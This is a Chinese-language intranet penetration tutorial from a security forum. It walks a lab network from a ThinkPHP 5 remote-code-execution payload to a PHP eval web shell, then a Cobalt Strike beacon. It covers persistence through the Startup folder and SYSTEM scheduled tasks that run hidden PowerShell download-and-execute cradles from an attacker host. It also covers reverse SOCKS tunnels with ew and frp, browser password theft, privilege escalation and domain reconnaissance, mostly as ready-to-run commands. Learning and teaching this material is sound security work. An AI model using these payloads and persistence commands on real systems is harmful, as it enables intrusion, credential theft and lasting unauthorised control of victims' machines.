<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="2bdea598c31d2b4f1fc528ffe4e119ec">一、前言</h2>
<p>前面写了一篇<a href="https://xz.aliyun.com/t/10439" target="_blank">内网渗透初探(一)</a>，写的不是特别好，然后也是在学习内网渗透相关的东西，就将其整理了一下，加了自己的思路，写好这篇内网渗透初探(二)～</p>
<h2 data-content="1" id="c81a7890196f5f40a87a07cfc9fbf1a4">二、环境介绍</h2>
<p>专门做了个拓扑图，首先外网打点，然后内网穿透，进域内，攻击域主机2、域主机1，通过pth、ptt的方式拿下域控。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124135739-6e94c174-4ceb-1.png"/></p>
<h2 data-content="1" id="ff4c7eed0515c6d393b4f87f19956da7">三、外网打点</h2>
<p>1、打开站点，为thinkphp默认页，版本为tp5<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124135756-78ac7b48-4ceb-1.png"/><br/>
2、尝试几个EXP后，成功执行命令</p>
<div class="highlight"><pre><span></span><span class="n">http:</span><span class="sr">//</span><span class="mf">192.168.31.32</span><span class="sr">/public/i</span><span class="n">ndex</span><span class="o">.</span><span class="n">php</span><span class="p">?</span><span class="n">s</span><span class="o">=</span><span class="n">captcha</span>

<span class="p">[</span><span class="n">post</span><span class="p">]</span>
<span class="n">_method</span><span class="o">=</span><span class="n">__construct</span><span class="o">&amp;</span><span class="n">method</span><span class="o">=</span><span class="n">get</span><span class="o">&amp;</span><span class="n">filter</span><span class="o">[]=</span><span class="n">call_user_func</span><span class="o">&amp;</span><span class="n">server</span><span class="o">[]=</span><span class="n">phpinfo</span><span class="o">&amp;</span><span class="n">get</span><span class="o">[]=</span><span class="n">phpinfo</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124135810-8116045c-4ceb-1.png"/><br/>
3、简单判断系统为Windows</p>
<div class="highlight"><pre><span></span><span class="n">http:</span><span class="sr">//</span><span class="mf">192.168.31.32</span><span class="sr">/public/i</span><span class="n">ndex</span><span class="o">.</span><span class="n">php</span><span class="p">?</span><span class="n">s</span><span class="o">=</span><span class="n">captcha</span>

<span class="p">[</span><span class="n">post</span><span class="p">]</span>
<span class="n">_method</span><span class="o">=</span><span class="n">__construct</span><span class="o">&amp;</span><span class="n">filter</span><span class="o">[]=</span><span class="nb">system</span><span class="o">&amp;</span><span class="n">method</span><span class="o">=</span><span class="n">get</span><span class="o">&amp;</span><span class="n">server</span><span class="p">[</span><span class="n">REQUEST_METHOD</span><span class="p">]</span><span class="o">=</span><span class="n">ipconfig</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124135827-8af1284e-4ceb-1.png"/><br/>
4、获取当前目录路径</p>
<div class="highlight"><pre><span></span><span class="n">http:</span><span class="sr">//</span><span class="mf">192.168.31.32</span><span class="sr">/public/i</span><span class="n">ndex</span><span class="o">.</span><span class="n">php</span><span class="p">?</span><span class="n">s</span><span class="o">=</span><span class="n">captcha</span>

<span class="p">[</span><span class="n">post</span><span class="p">]</span>
<span class="n">_method</span><span class="o">=</span><span class="n">__construct</span><span class="o">&amp;</span><span class="n">filter</span><span class="o">[]=</span><span class="nb">system</span><span class="o">&amp;</span><span class="n">method</span><span class="o">=</span><span class="n">get</span><span class="o">&amp;</span><span class="n">server</span><span class="p">[</span><span class="n">REQUEST_METHOD</span><span class="p">]</span><span class="o">=</span><span class="nb">chdir</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124135843-94b429e4-4ceb-1.png"/><br/>
5、在当前目录写入一句话木马123.php</p>
<div class="highlight"><pre><span></span><span class="n">http:</span><span class="sr">//</span><span class="mf">192.168.31.32</span><span class="sr">/public/i</span><span class="n">ndex</span><span class="o">.</span><span class="n">php</span><span class="p">?</span><span class="n">s</span><span class="o">=</span><span class="n">captcha</span>

<span class="p">[</span><span class="n">post</span><span class="p">]</span>
<span class="n">_method</span><span class="o">=</span><span class="n">__construct</span><span class="o">&amp;</span><span class="n">filter</span><span class="o">[]=</span><span class="nb">system</span><span class="o">&amp;</span><span class="n">method</span><span class="o">=</span><span class="n">get</span><span class="o">&amp;</span><span class="n">server</span><span class="p">[</span><span class="n">REQUEST_METHOD</span><span class="p">]</span><span class="o">=</span><span class="n">echo</span> <span class="s">"&lt;?php eval($_REQUEST[1])?&gt;"</span> <span class="o">&gt;</span><span class="mi">123</span><span class="o">.</span><span class="n">php</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124135902-9fe74062-4ceb-1.png"/><br/>
6、测试代码执行<br/>
<a href="http://192.168.31.32/public/123.php?1=phpinfo(" target="_blank">http://192.168.31.32/public/123.php?1=phpinfo();</a>;)<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124135921-aaecbe1a-4ceb-1.png"/><br/>
7、蚁剑连接<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140157-084cae26-4cec-1.png"/><br/>
8、上传CS马123.exe<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124135956-c0315cae-4ceb-1.png"/><br/>
9、执行并上线<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124135939-b5e1be42-4ceb-1.png"/></p>
<h2 data-content="1" id="d81e0d16b59550718d867f1d0014469f">四、权限维持</h2>
<h3 data-content="1" id="d2f7fd70de0b5e5a32e4763ada3b647f">(一)、设置延迟时间</h3>
<p>单独拎出来是因为之前有的人问我为什么他执行的命令要等好久才有响应，这里大概说明一下。CS作为红队协作工具，具有服务端和客户端，目标主机和服务器默认60秒通信一次，也是作为一定的隐蔽而存在的，所以一般我会设置为sleep 2，不快不慢刚刚好。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140213-11fdd620-4cec-1.png"/></p>
<h3 data-content="1" id="2557360a9afff932f816dfcf108d0afa">(二)、进程迁移</h3>
<p>1、首先查看进程列表<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140233-1def20d8-4cec-1.png"/><br/>
2、选择需要注入的进程并点击inject进行注入（进程可以选择一些比较常见的，不会常关闭的进程，如explorer.exe）<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140501-761db710-4cec-1.png"/><br/>
3、然后便可以获取一个基于explorer.exe的shell<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140352-4caa07b2-4cec-1.png"/></p>
<h3 data-content="1" id="10713de1ff81afcb46772002420819fc">(三)、启动项</h3>
<p>1、将需要执行的exe文件复制到启动文件夹下即可。<br/>
复制到的路径是windows启动路径，当系统重启之后，会默认运行里面的程序</p>
<div class="highlight"><pre><span></span><span class="n">shell</span> <span class="n">copy</span> <span class="s">"123.exe"</span> <span class="err">"</span><span class="n">C:</span><span class="o">\</span><span class="n">ProgramData</span><span class="o">\</span><span class="n">Microsoft</span><span class="o">\</span><span class="n">Windows</span><span class="o">\</span><span class="n">Start</span> <span class="n">Menu</span><span class="o">\</span><span class="n">Programs</span><span class="o">\</span><span class="n">StartUp</span><span class="o">\</span><span class="err">"</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140413-58feb184-4cec-1.png"/><br/>
有条件的话，可以将快捷方式放过去，将木马隐藏在某文件夹下，命名为win.exe或system.exe，也算是做了一层隐蔽。</p>
<h3 data-content="1" id="12bb51f88f83b65faa38080b6aae862d">(四)、计划任务</h3>
<p>1、生成powershell上线语句<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140336-42eee5b2-4cec-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140302-2f37c138-4cec-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">powershell</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">nop</span> <span class="o">-</span><span class="n">w</span> <span class="n">hidden</span> <span class="o">-</span><span class="n">c</span> <span class="s">"IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx:10081/a'))"</span>
</pre></div>
<p>2、运行语句即会上线CS<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140127-f61eab8c-4ceb-1.png"/><br/>
3、设置计划任务(每隔一个小时，以system权限执行命令)</p>
<div class="highlight"><pre><span></span><span class="n">其他启动时间参数</span><span class="err">：</span>
<span class="o">/</span><span class="n">sc</span> <span class="n">onlogon</span>  <span class="n">用户登录时启动</span>
<span class="o">/</span><span class="n">sc</span> <span class="n">onstart</span>  <span class="n">系统启动时启动</span>
<span class="o">/</span><span class="n">sc</span> <span class="n">onidle</span>   <span class="n">系统空闲时启动</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="n">shell</span> <span class="n">schtasks</span> <span class="sr">/create /</span><span class="n">tn</span> <span class="n">win</span> <span class="sr">/sc HOURLY /mo</span> <span class="mi">1</span> <span class="sr">/tr "powershell.exe -nop -w hidden -c 'IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx:10081/</span><span class="n">a</span><span class="s">'))'</span><span class="err">"</span> <span class="sr">/ru system /</span><span class="n">f</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140110-ec1edbde-4ceb-1.png"/><br/>
4、启动计划任务</p>
<div class="highlight"><pre><span></span><span class="n">shell</span> <span class="n">schtasks</span> <span class="sr">/run /i</span> <span class="o">/</span><span class="n">tn</span> <span class="s">"win"</span>
</pre></div>
<p>5、设置计划任务(用户登录时启动)</p>
<div class="highlight"><pre><span></span><span class="n">shell</span> <span class="n">schtasks</span> <span class="sr">/create /</span><span class="n">tn</span> <span class="n">win1</span> <span class="sr">/tr "powershell.exe -nop -w hidden -c 'IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx:10081/</span><span class="n">a</span><span class="s">'))'</span><span class="err">"</span> <span class="o">/</span><span class="n">sc</span> <span class="n">ONLOGON</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="n">shell</span> <span class="n">schtasks</span> <span class="sr">/create /sc</span> <span class="n">MINUTE</span> <span class="sr">/mo 1 /</span><span class="n">tn</span> <span class="n">win2</span> <span class="sr">/tr "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://xx.xx.xx.xx:10081/</span><span class="n">a</span><span class="err">'</span><span class="p">))</span><span class="o">\</span><span class="s">""</span>
</pre></div>
<p>6、删除计划任务</p>
<div class="highlight"><pre><span></span><span class="n">shell</span> <span class="n">schtasks</span> <span class="sr">/delete /</span><span class="n">tn</span> <span class="n">win2</span> <span class="o">/</span><span class="n">f</span>
</pre></div>
<p>7、同样的，不仅仅可以放powershell语句，放木马文件路径也是一样的。</p>
<div class="highlight"><pre><span></span><span class="n">shell</span> <span class="n">schtasks</span> <span class="sr">/create /</span><span class="n">tn</span> <span class="n">win</span> <span class="sr">/sc HOURLY /mo</span> <span class="mi">1</span> <span class="sr">/tr "C:\Windows\Temp\123.exe" /</span><span class="n">ru</span> <span class="nb">system</span> <span class="o">/</span><span class="n">f</span>
</pre></div>
<h2 data-content="1" id="130f7d86a08278877909850581ada747">五、主机信息收集</h2>
<div class="highlight"><pre><span></span><span class="n">CS中</span><span class="err">：</span><span class="n">shell</span><span class="o">+</span><span class="n">命令即可</span>
<span class="sr">//</span><span class="n">主机信息</span>
<span class="n">systeminfo</span>

<span class="sr">//</span><span class="n">网络信息</span>
<span class="n">ipconfig</span> <span class="o">/</span><span class="n">all</span>

<span class="sr">//</span><span class="n">路由表</span>
<span class="n">arp</span> <span class="o">-</span><span class="n">a</span>

<span class="sr">//</span><span class="n">进程</span><span class="err">，</span><span class="n">查AV</span>
<span class="n">tasklist</span>

<span class="sr">//</span><span class="n">端口占用情况</span>
<span class="n">netstat</span> <span class="o">-</span><span class="n">ano</span>

<span class="sr">//</span><span class="n">是否域环境</span>
<span class="n">net</span> <span class="n">user</span> <span class="o">/</span><span class="n">domain</span>

<span class="sr">//</span><span class="n">是否出网</span>
<span class="n">ping</span> <span class="n">baidu</span><span class="o">.</span><span class="n">com</span> <span class="o">-</span><span class="n">n</span> <span class="mi">2</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140446-6cd692e4-4cec-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140012-c9d2b096-4ceb-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140030-d41dae34-4ceb-1.png"/></p>
<p>抓取浏览器保存的密码，以及横向目标主机<br/>
<a href="https://github.com/QAX-A-Team/BrowserGhost" target="_blank">https://github.com/QAX-A-Team/BrowserGhost</a><br/>
上传并执行<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140045-dd42b9e6-4ceb-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140141-fecdda1e-4ceb-1.png"/></p>
<h2 data-content="1" id="0cb3e56a9bcfcc1df2b1271e4b018fdf">六、隧道搭建</h2>
<h3 data-content="1" id="b77a640ebf4fe8a815e9820975da5523">(一)、ew</h3>
<p>1、先传入ew软件<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140318-38630056-4cec-1.png"/><br/>
2、服务器上执行如下命令</p>
<div class="highlight"><pre><span></span><span class="o">./</span><span class="n">ew_for_linux64</span> <span class="o">-</span><span class="n">s</span> <span class="n">rcsocks</span> <span class="o">-</span><span class="n">l</span> <span class="mi">1080</span> <span class="o">-</span><span class="n">e</span> <span class="mi">8888</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140429-62a9bd96-4cec-1.png"/><br/>
3、受害机器上执行如下命令</p>
<div class="highlight"><pre><span></span><span class="n">execute</span> <span class="s">"E:\New File\WWW\phpStudy\WWW\public\ew.exe"</span>  <span class="o">-</span><span class="n">s</span> <span class="n">rssocks</span> <span class="o">-</span><span class="n">d</span> <span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">e</span> <span class="mi">8888</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140534-897cdca0-4cec-1.png"/><br/>
4、设置连接服务器等socks即可<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140604-9b34874a-4cec-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140832-f3e9ae10-4cec-1.png"/><br/>
5、成功访问到内网<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140753-dc89b5d0-4cec-1.png"/></p>
<h3 data-content="1" id="f47b49622a96630783b06ebf340aa3eb">(二)、frp</h3>
<p>下载地址<br/>
<a href="https://github.com/fatedier/frp/releases/tag/v0.38.0" target="_blank">https://github.com/fatedier/frp/releases/tag/v0.38.0</a><br/>
1、服务器frps1.ini设置</p>
<div class="highlight"><pre><span></span><span class="p">[</span><span class="n">common</span><span class="p">]</span>
<span class="n">bind_addr</span> <span class="o">=</span> <span class="mf">0.0.0.0</span>
<span class="n">bind_port</span> <span class="o">=</span> <span class="mi">7080</span>
<span class="n">token</span> <span class="o">=</span> <span class="n">admin123</span>
<span class="n">dashboard_user</span> <span class="o">=</span> <span class="n">admin</span>
<span class="n">dashboard_pwd</span> <span class="o">=</span> <span class="n">admin123</span>
</pre></div>
<p>2、运行命令</p>
<div class="highlight"><pre><span></span><span class="o">./</span><span class="n">frps</span> <span class="o">-</span><span class="n">c</span> <span class="n">frps1</span><span class="o">.</span><span class="n">ini</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140248-2649d02a-4cec-1.png"/><br/>
3、将frpc.exe和frpc.ini上传到受害机<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140619-a436e52c-4cec-1.png"/><br/>
frpc.ini配置如下：</p>
<div class="highlight"><pre><span></span><span class="p">[</span><span class="n">common</span><span class="p">]</span>
<span class="n">server_addr</span> <span class="o">=</span> <span class="n">IP</span>
<span class="n">server_port</span> <span class="o">=</span> <span class="mi">7080</span>
<span class="n">token</span> <span class="o">=</span> <span class="n">admin123</span>
<span class="n">tls_enable</span><span class="o">=</span><span class="n">true</span>
<span class="n">pool_count</span><span class="o">=</span><span class="mi">5</span>
<span class="p">[</span><span class="n">plugin_socks</span><span class="p">]</span> 
<span class="n">type</span> <span class="o">=</span> <span class="n">tcp</span> 
<span class="n">remote_port</span> <span class="o">=</span> <span class="mi">4567</span>
<span class="n">plugin</span> <span class="o">=</span> <span class="n">socks5</span> 
<span class="n">plugin_user</span> <span class="o">=</span> <span class="n">admin</span>
<span class="n">plugin_passwd</span> <span class="o">=</span> <span class="n">admin123</span>
<span class="n">use_encryption</span> <span class="o">=</span> <span class="n">true</span> 
<span class="n">use_compression</span> <span class="o">=</span> <span class="n">true</span>
</pre></div>
<p>4、运行命令</p>
<div class="highlight"><pre><span></span><span class="n">shell</span> <span class="s">"C:\Windows\temp\frpc.exe -c C:\Windows\temp\frpc.ini"</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141203-71924c32-4ced-1.png"/><br/>
5、在服务器上可以看到，已经有连接返回了<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141249-8cad1fba-4ced-1.png"/><br/>
6、设置proxifier指向服务器，注意设置账号密码<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140816-e9f20f74-4cec-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141701-22c202d6-4cee-1.png"/><br/>
7、成功访问到目标内网<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140702-be0af47a-4cec-1.png"/></p>
<h2 data-content="1" id="b9360f784051f99087746aa384bd48a2">七、横向移动1</h2>
<p>1、前面获取了phpmyadmin的账号密码，尝试登录<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140648-b56cda90-4cec-1.png"/><br/>
2、获取数据库路径</p>
<div class="highlight"><pre><span></span><span class="nb">select</span> <span class="nv">@@datadir</span><span class="p">;</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140633-ac686fb8-4cec-1.png"/><br/>
3、在变量中也可以大概判断出一些路径信息<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141149-68f4aa98-4ced-1.png"/><br/>
4、修改日志路径<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141336-a8d1e59a-4ced-1.png"/><br/>
5、通过查询一句话木马来写入到123.php中</p>
<div class="highlight"><pre><span></span><span class="nb">select</span> <span class="s">'&lt;?php eval($_REQUEST[1]); ?&gt;'</span><span class="p">;</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140903-061427d2-4ced-1.png"/><br/>
6、执行完后，尝试执行phpinfo成功<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141536-f075da82-4ced-1.png"/><br/>
7、蚁剑连接<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140517-7f9e953e-4cec-1.png"/><br/>
8、新建一个管理员用户，显示权限不足<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141505-dd945c36-4ced-1.png"/><br/>
9、这里先简单用potato提权，后面会列举几个提权方法<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140848-fd635c84-4cec-1.png"/><br/>
10、将用户添加到管理员组<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141235-84917100-4ced-1.png"/></p>
<h2 data-content="1" id="8c1a2b2c5f0c869adeda21a6d772cb14">八、内网信息收集</h2>
<h3 data-content="1" id="6ead1cfb54effffbb7be507fbb0d2591">(一)、基础信息收集</h3>
<p>1、检测获取的shell当前权限</p>
<div class="highlight"><pre><span></span><span class="n">whoami</span> <span class="sr">/user &amp;&amp; whoami /</span><span class="n">priv</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141714-2b0e0fe8-4cee-1.png"/><br/>
2、查询网络配置信息</p>
<div class="highlight"><pre><span></span><span class="n">ipconfig</span> <span class="sr">/all              /</span><span class="o">/</span> <span class="n">本机IP等信息</span>
<span class="n">arp</span> <span class="o">-</span><span class="n">a</span>                     <span class="sr">//</span> <span class="n">arp缓存</span>
<span class="n">netstat</span> <span class="o">-</span><span class="n">ano</span>        <span class="sr">//</span><span class="n">查询端口连接情况</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141132-5ec5b6b6-4ced-1.png"/><br/>
重点关注一下DNS服务器，有可能就是当前所在域的域控<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141646-1a55f58a-4cee-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142435-3158e3d6-4cef-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142522-4d86aa16-4cef-1.png"/><br/>
3、查询系统信息</p>
<div class="highlight"><pre><span></span><span class="n">systeminfo</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140948-20b7e9ca-4ced-1.png"/><br/>
4、其他信息收集可以使用脚本<br/>
<a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar" target="_blank">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a><br/>
直接执行即可<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140933-17e561a6-4ced-1.png"/><br/>
会在目录下新建一个out.html<br/>
打开里面即是收集到到信息<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140549-927156ec-4cec-1.png"/></p>
<h3 data-content="1" id="5050c0e889545323ce0344369b532409">(二)、域内信息收集</h3>
<div class="highlight"><pre><span></span><span class="n">查看当前登陆域</span>
<span class="n">net</span> <span class="n">config</span> <span class="n">workstation</span>

<span class="n">查询域用户</span>
<span class="n">net</span> <span class="n">user</span> <span class="o">/</span><span class="n">domain</span>

<span class="n">查询指定域用户详细信息</span>
<span class="n">net</span> <span class="n">user</span> <span class="n">xxx</span> <span class="o">/</span><span class="n">domain</span>   

<span class="n">查询域控制器</span>
<span class="n">net</span> <span class="nb">time</span> <span class="o">/</span><span class="n">domain</span>

<span class="n">获取域内用户详细信息</span>
<span class="n">wmic</span> <span class="n">useraccount</span> <span class="n">get</span> <span class="o">/</span><span class="n">all</span>

<span class="n">查询域控制器主机名</span>
<span class="n">nltest</span> <span class="o">/</span><span class="n">DCLIST:god</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141928-7a573e76-4cee-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141557-fcd0049c-4ced-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141302-949f6278-4ced-1.png"/></p>
<h3 data-content="1" id="c56f7cd90ce0abb63fe45bf27548d4eb">1. 定位域控制器</h3>
<p>1、基于ping主域来获取</p>
<div class="highlight"><pre><span></span><span class="n">ping</span> <span class="n">xxx</span><span class="o">.</span><span class="n">cool</span> <span class="o">-</span><span class="n">n</span> <span class="mi">2</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141001-28bc5df4-4ced-1.png"/><br/>
2、查询dns服务器</p>
<div class="highlight"><pre><span></span><span class="n">ipconfig</span> <span class="o">/</span><span class="n">all</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141322-a090de90-4ced-1.png"/><br/>
3、查询dns解析记录</p>
<div class="highlight"><pre><span></span><span class="n">nslookup</span> <span class="o">-</span><span class="n">type</span><span class="o">=</span><span class="n">all</span> <span class="n">_ldap</span><span class="o">.</span><span class="n">_tcp</span><span class="o">.</span><span class="n">dc</span><span class="o">.</span><span class="n">_msdcs</span><span class="o">.</span><span class="sr">&lt;域名&gt;</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141729-338ac044-4cee-1.png"/></p>
<h3 data-content="1" id="edd2bd84313086e52e616b4ba19ee506">2. 存活主机探测</h3>
<h3 data-content="1" id="4565f897ad3f5faf4f2d95037a3769f1">基于netbios协议</h3>
<p>工具:   nbtscan<br/>
将nbtscan.exe上传到目标主机上<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141220-7b6f97d2-4ced-1.png"/><br/>
执行命令扫描当前主机所在C段</p>
<div class="highlight"><pre><span></span><span class="n">nbtscan</span><span class="o">-</span><span class="mf">1.0.35</span><span class="o">.</span><span class="n">exe</span> <span class="mf">192.168.30.0</span><span class="o">/</span><span class="mi">24</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141520-e6b48912-4ced-1.png"/></p>
<h3 data-content="1" id="f382ed6ce84d60df786ce83d261f4e3b">基于ICMP协议</h3>
<p>工具:   ping命令<br/>
相当于使用ping来探测主机存活（特点就是慢。。。）</p>
<div class="highlight"><pre><span></span><span class="k">for</span> <span class="sr">/l %i in (1,1,255) do @ ping 192.168.30.%i -w 1 -n 1|find /i</span> <span class="s">"ttl="</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124140917-0e54a264-4ced-1.png"/></p>
<h3 data-content="1" id="0503d26353fc50d238f483b1a4dd7c43">基于ARP协议</h3>
<p>工具:   arp-scan.exe<br/>
下载地址：<br/>
<a href="https://github.com/QbsuranAlang/arp-scan-windows-" target="_blank">https://github.com/QbsuranAlang/arp-scan-windows-</a><br/>
将文件上传到目标主机上，执行如下命令：<br/>
arp-scan.exe -t 【ip/ip段】<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141107-502535b4-4ced-1.png"/></p>
<h2 data-content="1" id="eb8829a560fb08f834894caa19525347">九、提权</h2>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141620-0ab62186-4cee-1.png"/></p>
<h3 data-content="1" id="6f5d260870475f2ed88caa44e0eef35c">(一)、内核提权</h3>
<p>查询安装的补丁情况，通过在线工具查询可能存在的内核提权</p>
<div class="highlight"><pre><span></span><span class="n">获取安装补丁的方法</span><span class="err">：</span>
<span class="mi">1</span><span class="err">、</span><span class="n">systeminfo</span>
<span class="n">systeminfo</span> <span class="o">|</span> <span class="n">findstr</span> <span class="n">KB</span>

<span class="mi">2</span><span class="err">、</span><span class="n">wmic</span>
<span class="n">wmic</span> <span class="n">qfe</span> <span class="n">get</span> <span class="n">caption</span><span class="p">,</span><span class="n">description</span><span class="p">,</span><span class="n">hotfixid</span><span class="p">,</span><span class="n">installedon</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141815-4ef15e24-4cee-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141841-5e9cf748-4cee-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142033-a18105d6-4cee-1.png"/><br/>
复制补丁号进行查询<br/>
在线网站：<br/>
<a href="http://bugs.hacking8.com/tiquan/" target="_blank">http://bugs.hacking8.com/tiquan/</a><br/>
<a href="https://i.hacking8.com/tiquan/" target="_blank">https://i.hacking8.com/tiquan/</a><br/>
<a href="http://blog.neargle.com/win-powerup-exp-index/" target="_blank">http://blog.neargle.com/win-powerup-exp-index/</a><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124141758-453b9296-4cee-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142231-e7a9c89a-4cee-1.png"/><br/>
exp下载地址也可以直接看github<br/>
<a href="https://github.com/Al1ex/WindowsElevation" target="_blank">https://github.com/Al1ex/WindowsElevation</a></p>
<h3 data-content="1" id="acb0e80149a1a275a202f64de589d561">(二)、potato提权</h3>
<p>直接将potato exp工具拉到对应主机上，执行命令即可</p>
<div class="highlight"><pre><span></span><span class="n">potato</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">p</span> <span class="s">"需要执行的命令"</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20211124142116-bb0f6880-4cee-1.png"/></p>
<h3 data-content="1" id="9b8205b2c97bcea97c97d8d5dbd8ce51">(三)、可信任服务路径漏洞提权</h3>
<p>这个是一个windows路径解析的问题，如果一个服务的运行路径没有被双引号包裹，并且它的路径中包含有空格，那么就可能可以被利用，当服务运行的权限为system，那么相当于进行了提权。</p>
<div class="highlight"><pre><span></span><span class="n">正常要运行的是service</span><span class="o">.</span><span class="n">exe</span>
<span class="n">解析顺序如下</span><span class="err">：</span>
<span class="n">C:</span><span class="o">\</span><span class="n">Program</span><span class="o">.</span><span class="n">exe</span>
<span class="n">C:</span><span class="o">\</span><span class="n">Program</span> <span class="n">files</span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="o">\</span><span class="n">test</span><span class="o">.</span><span class="n">exe</span>
<span class="n">C:</span><span class="o">\</span><span class="n">Program</span> <span class="n">files</span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="o">\</span><span class="n">test</span> <span class="n">upload</span><span class="o">\</span><span class="n">service</span><span class="o">.</span><span class="n">exe</span>

<span class="n">也就是可以在C盘更目录</span><span class="err">，</span><span class="n">将木马文件命名为Program</span><span class="o">.</span><span class="n">exe</span><span class="p">;</span><span class="n">或者在C:</span><span class="o">\</span><span class="n">Program</span> <span class="n">files</span><span class="p">(</span><span class="n">x86</span><span class="p">)</span><span class="o">\</span><span class="n">目录下</span><span class="err">，</span><span class="n">将木马文件命名为test</span><span class="o">.</span><span class="n">exe</span><span class="err">，</span><span class="n">就有可能获取到system权限或高权限的shell</span>
